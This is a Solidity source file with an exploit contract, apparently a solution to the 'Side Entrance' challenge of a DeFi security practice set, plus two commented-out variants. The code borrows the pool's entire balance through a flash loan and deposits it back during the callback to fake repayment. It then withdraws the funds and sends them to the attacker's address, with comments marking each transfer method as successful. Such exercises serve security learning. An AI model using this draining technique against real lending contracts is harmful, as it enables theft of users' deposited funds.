
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


// interface ISideEntranceLenderPool {
//     function deposit() external payable;
//     function withdraw() external;
//     function flashLoan(uint256 amount) external;
// }
// interface IFlashLoanEtherReceiver {
//     function execute() external payable;
// }
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceExploit  {
    using Address for address payable;

    SideEntranceLenderPool  pool;
    uint  etherInPool;
    address payable attacker = payable(msg.sender);

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    function execute() external payable  {
        pool.deposit{value:msg.value}();
    }

    receive() external payable {
        // 1. attacker.transfer(address(this).balance);  // => 성공
        // 2. attacker.sendValue(address(this).balance);  // => 성공
        attacker.call{value: address(this).balance}(""); // => 성공
    }
}

//////////////////////////////
// pragma solidity ^0.8.0;

// interface IPool {
//     function deposit() external payable;
//     function withdraw() external;
//     function flashLoan(uint256 amount) external;
// }
// interface IFlashLoanEtherReceiver {
//     function execute() external payable;
// }

// contract SideEntranceExploit is IFlashLoanEtherReceiver{
//     IPool immutable pool;
//     address immutable attacker;
//     constructor(address _pool) {
//         pool = IPool(_pool);
//         attacker = msg.sender;
//     }

//     function attack() public {
//         pool.flashLoan(address(pool).balance);
//         pool.withdraw();
//     }
    
//     function execute() payable external override{
//         pool.deposit{value: msg.value}();
//     }

//     receive() payable external {
//         payable(attacker).call{value: address(this).balance};
//     }

// }




///////////////////////////////////////////
// pragma solidity ^0.8.0;
// import "@openzeppelin/contracts/utils/Address.sol";
// import "./SideEntranceLenderPool.sol";



// contract SideEntranceExploit  {


//     SideEntranceLenderPool public pool  ;
//     address  attacker;

//     constructor(address _pool){
//         pool = SideEntranceLenderPool(_pool);
//         attacker = msg.sender;
//     }
   

//    function exploit()external  {
//         pool.flashLoan(address(pool).balance);
//         pool.withdraw();
        
//    }
   
//    function execute() external payable  {
//        pool.deposit{value: msg.value}();
//    }

//    receive() external payable{
//        payable(attacker).call{value: address(this).balance};
//    }

// }
 